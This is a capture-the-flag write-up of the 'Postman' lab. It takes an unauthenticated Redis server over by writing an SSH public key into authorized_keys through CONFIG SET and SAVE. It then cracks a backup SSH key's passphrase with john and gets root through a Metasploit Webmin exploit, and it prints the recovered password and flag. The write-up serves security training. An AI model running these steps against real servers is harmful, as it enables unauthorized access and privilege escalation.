## Postman

### Lab Details 

- Difficulty: Easy
- Type: Redis, Web, SSH, Priv Esc, Linux

#### Tasks
Q1: What version of Redis is running on port 6379?
- run `nmap -sT -T4 -vv -A -p- -oA Postman target_ip`
```
6379/open/tcp//redis//Redis key-value store 4.0.9/
```

Q2: What is the config directory for redis?
- to find the config directory for redis firt need to connect to redis services 
`redis-cli -h target_ip`
- then locate the config directory by running below `config get dir` or `config get *` to get all configuration settings
```
10.10.10.160:6379> config get dir 
1) "dir"
2) "/var/lib/redis" -> this is the config directory 

10.10.10.160:6379> config get * 
...
##return a list of key-value pairs where each key is a configuration parameter and the corresponding value is its current setting.
1) "dbfilename"         #Key: Name of the RDB snapshot file
2) "dump.rdb"           #Value: Default filename
3) "requirepass"        #Key: Password for authentication
4) ""                   #Value: no password set  
5) "dir"                #Key: Directory for persistence files
6) "/var/lib/redis"     #Value: Default storage directory 
...
165) "dir"              #Key:  Working directory where Redis stores
166) "/var/lib/redis"   #Value: The directory where Redis saves its persistent data
...
```

Q3: As which user you can get code execution through Redis?
- since requirepass is no value which means anyone can access/modify data remotely 
- check if we can run whoami on redis remote by running `ACL whoami` however return error
```
10.10.10.160:6379> ACL whoami
(error) ERR unknown command 'ACL'
```
- check remote version
```
10.10.10.160:6379> info server
# Server
redis_version:4.0.9
```
- test if we have write permission over remote redis service 
``` 
10.10.10.160:6379> set test:write "hello world"
OK
```
- in the end i wasnt able to get the name from remote instance so i tried default and then redis and redis is the correct answer i think its might be due to the config location sometimes it can be at /home/redis and /home is where local user directory resides

Q4: What's the full path of an SSH backup key that redis can read?
- in order to read the path we will need to first gain the initial foodhold over the remote target
- we can exploit the lack of write restriction by uploading self generated public key to the remote target 
- below are lins to useful posts on how to perform such attack
  - https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419 - https://secybr.com/posts/redis-pentesting-best-practices/
- gist as per below
```
$: ssh-keygen -t rsa
$: (echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
$: cat foo.txt | redis-cli -h 10.10.x.x -x set crackit
$:  redis-cli -h 10.10.x.x
10.10.x.x:6379> config set dir /var/lib/redis/.ssh/
OK
10.10.x.x:6379> config set dbfilename "authorized_keys"
OK
10.10.x.x:6379> save
OK
```
- after uploading the public key to remote we can ssh in using the corresponding private key and user named redis
```
ssh -i id_rsa redis@target_ip
```
- we get a shell as redis
```
redis@Postman:~$ whoami
redis
```
- run linpeas.sh to gain more info on the target, we found `id_rsa.bak` for user Matt
```
╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak 
```
- the last permission bit gives others rx access

Q5: What is the password for the SSH key?
- the private key requires password when `ssh -i id_rsa Matt@target_ip`
- therefore need to crack it before, below is using john as hashcat does not support ssh 
```
$: ssh2john id_rsa > rsa.hash 
$: john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash 
...
computer2008     (id_rsa_matt)

Q6: Which user uses the same password as the one used to decrypt the SSH key?
 - Matt is the user as its owned by Matt

Q7: Submit the flag located in the Matt user's home directory.
- `cat /home/Matt/user.txt`

Q8: Which vulnerable version of Webmin is running on the machine?
- found theres `/usr/share/webmin/` directory on the machine and there is a version file in that directory 
- `cat version` -> 1.910 
```
╔══════════╣ Analyzing Postfix Files (limit 70)
...
drwxr-xr-x 5 root root 12288 Aug 25  2019 /usr/share/webmin/postfix
```


Q9: Which user does the Webmin instance run as?
- based on the output of linpeas.sh webmin is running as root 
```
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                            
                ╚════════════════════════════════════════════════╝                                            
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
...
root        724  0.0  3.1  90944 28832 ?        Ss   11:51   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
...

Q10: 
- use linux/http/webmin_packageup_rce from msfconsole
- set SSL = True and the rest of the info, username is Matt and password is computer2008
- will get a root shell back 
```
root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
cat /root/root.txt
2b45ad724078db87b9cbb053aaa9ada5
```



#### Lesson Learned
- learned how to compromise weakly configured redis server but using readily available info
- use john to crack ssh private key passwords
